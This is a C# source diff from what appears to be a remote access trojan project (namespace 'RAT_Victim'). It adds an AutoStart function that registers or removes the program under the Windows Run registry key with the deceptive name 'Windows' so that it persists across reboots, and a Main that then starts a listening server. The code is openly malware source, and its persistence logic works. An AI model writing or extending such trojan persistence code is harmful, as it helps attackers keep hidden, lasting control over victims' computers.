@@ -1,8 +1,11 @@
-﻿using RAT_Library;
+﻿using Microsoft.Win32;
+using RAT_Library;
 using System;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Windows.Forms;
 
 namespace RAT_Victim
 {
@@ -12,7 +15,20 @@ namespace RAT_Victim
 
         private static void Main()
         {
+            AutoStart(false);
             StartServer();
+        }
+
+        private static void AutoStart(bool add)
+        {
+            var subKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            const string appName = "Windows";
+            var valueExists = subKey.GetValue(appName) != null;
+            
+            if (add && !valueExists)
+                subKey.SetValue(appName, Application.ExecutablePath);
+            else if (!add && valueExists)
+                subKey.DeleteValue(appName);
         }
 
         private static void StartServer()
